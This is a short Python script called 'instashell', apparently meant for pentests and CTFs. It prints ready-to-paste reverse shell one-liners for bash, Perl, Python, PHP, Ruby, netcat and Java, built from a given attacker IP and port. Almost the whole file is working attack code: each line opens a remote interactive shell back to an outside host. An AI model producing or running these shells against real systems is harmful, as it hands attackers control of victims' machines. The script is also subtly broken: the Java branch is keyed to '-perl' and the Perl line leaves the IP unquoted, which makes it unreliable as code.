import sys

# Writen by Checkn8
# Shell syntax was taken from the Pentest Monkey reverse shell cheart sheat. 
# Help page
if sys.argv[1] == "--help":
    print('''
    Description:\n
    instashell generates the correct reverse shell syntax for any code platform for easy injection during a pentest or CTF.\n
    Usage:\n
    instashell <option> <ip> <port>\n
    Options:\n
    -bash  Bash shell\n
    -perl  Perl shell\n
    -py    Python shell\n
    -php   PHP shell\n
    -ruby  Ruby shell\n
    -nc    Netcat shell\n
    -java  Java shell\n
    ''')

# Check if valid params were passed
if len(sys.argv) == 4:
    shell_type = sys.argv[1]
    ip = sys.argv[2]
    port = sys.argv[3]
    port = str(port)

    # check the shell type

    # Bash
    if sys.argv[1] == "-bash":
        print("Copy the syntax below")
        print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
        exit()

    # Perl
    if sys.argv[1] == "-perl":
        print("Copy the syntax below")
        print("""perl -e 'use Socket;$i=""" + ip + """;$p=""" + port + """;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""")
        exit()

    # Python
    if sys.argv[1] == "-py":
        print("Copy the syntax below")
        print('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("''' + ip +'''",''' + port + """));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""")
        exit()

    # PHP
    if sys.argv[1] == "-php":
        print("Copy the syntax below")
        print('''php -r '$sock=fsockopen("''' + ip + '''",''' + port + """);exec("/bin/sh -i <&3 >&3 2>&3");'""")
        exit()

    # Ruby
    if sys.argv[1] == "-ruby":
        print("Copy the syntax below")
        print('''ruby -rsocket -e'f=TCPSocket.open("''' + ip +'''",''' + port + """).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""")
        exit()

    # Netcat
    if sys.argv[1] == "-nc":
        print("Copy the syntax below. ** This will only work with netcat versions that support -e. **")
        print("nc -e /bin/sh " + ip + " " + port )
        exit()

    # Perl
    if sys.argv[1] == "-perl":
        print("Copy the syntax below")
        print('''r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/''' + ip + '''/''' + port +''';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()''')
        exit()
    else:
        print("Invalid Syntax Order: use --help for usage info")
else:
    print("To Few Arguments Supplied: use --help for usage info")
    exit()
